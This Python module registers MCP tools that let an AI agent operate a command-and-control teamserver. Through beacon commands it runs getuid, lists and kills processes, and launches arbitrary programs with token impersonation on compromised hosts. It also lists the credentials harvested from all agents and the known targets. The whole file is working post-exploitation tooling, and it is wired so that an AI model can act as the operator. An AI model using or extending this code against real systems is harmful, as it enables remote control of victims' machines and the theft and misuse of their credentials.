"""
tools/recon.py — Reconnaissance tools.

Covers:
  - Native beacon commands: getuid, ps (list/kill/run), credentials, targets
"""
from __future__ import annotations

from mcp.server.fastmcp import FastMCP

from tools._context  import ToolContext
from tools._helpers  import exec_cmd
from utils.logging   import get_logger

log = get_logger("tools.recon")


def register_recon_tools(mcp: FastMCP, ctx: ToolContext) -> None:
    """Register recon tools: native commands."""

    # ── Native beacon recon commands ──────────────────────────────────────────

    @mcp.tool(description=(
        "Get the current user identity on the agent.\n"
        "Runs native 'getuid' beacon command.\n"
        "Returns: username and privilege level of the current token."
    ))
    async def get_uid(agent_id: str) -> str:
        return await exec_cmd(ctx, agent_id, "getuid",
                              {"command": "getuid", "message": "Task: get username"},
                              log_name="getuid")

    @mcp.tool(description=(
        "List all running processes on the agent host.\n"
        "Runs 'ps list' beacon command.\n"
        "Returns: process list with PID, name, user, and session info."
    ))
    async def list_processes(agent_id: str) -> str:
        return await exec_cmd(ctx, agent_id, "ps list",
                              {"command": "ps", "subcommand": "list",
                               "message": "Task: show process list"},
                              log_name="ps.list")

    @mcp.tool(description=(
        "Kill a running process by PID.\n"
        "Args: pid (INT, required) — process ID to terminate."
    ))
    async def kill_process(agent_id: str, pid: int) -> str:
        return await exec_cmd(ctx, agent_id, f"ps kill {pid}",
                              {"command": "ps", "subcommand": "kill",
                               "pid": pid, "message": "Task: kill process"},
                              log_name="ps.kill")

    @mcp.tool(description=(
        "Run a program on the agent host via 'ps run'.\n"
        "Args:\n"
        "  args: Full path + arguments, e.g. 'C:\\\\Windows\\\\System32\\\\cmd.exe /c whoami'\n"
        "  suspend: Start process suspended (-s)\n"
        "  with_output: Capture output (-o)\n"
        "  impersonate: Use token impersonation (-i)"
    ))
    async def run_process(
        agent_id:    str,
        args:        str,
        suspend:     bool = False,
        with_output: bool = True,
        impersonate: bool = False,
    ) -> str:
        flags = ""
        if suspend:     flags += " -s"
        if with_output: flags += " -o"
        if impersonate: flags += " -i"
        data: dict = {"command": "ps", "subcommand": "run", "args": args}
        if suspend:     data["-s"] = True
        if with_output: data["-o"] = True
        if impersonate: data["-i"] = True
        return await exec_cmd(ctx, agent_id, f"ps run{flags} {args}", data, log_name="ps.run")

    @mcp.tool(description="List all credentials harvested across all agents.")
    async def list_credentials() -> str:
        creds = await ctx.client.list_creds_raw()
        if not creds:
            return "No credentials stored."
        lines = [f"Found {len(creds)} credential(s):"]
        for c in creds:
            user  = c.get("c_username", "?")
            realm = c.get("c_realm", "")
            host  = c.get("c_host", "")
            tag   = c.get("c_tag", "")
            lines.append(f"  {realm}\\{user} @ {host} [{tag}]")
        return "\n".join(lines)

    @mcp.tool(description="List all known targets/hosts in the teamserver database.")
    async def list_targets() -> str:
        targets = await ctx.client.list_targets_raw()
        if not targets:
            return "No targets stored."
        lines = [f"Found {len(targets)} target(s):"]
        for t in targets:
            comp   = t.get("t_computer", "?")
            addr   = t.get("t_address", "?")
            domain = t.get("t_domain", "")
            alive  = t.get("t_alive", False)
            agents = ", ".join(t.get("t_agents") or [])
            status = "ALIVE" if alive else "DEAD "
            lines.append(f"  [{status}] {domain}\\{comp} ({addr}) agents=[{agents}]")
        return "\n".join(lines)
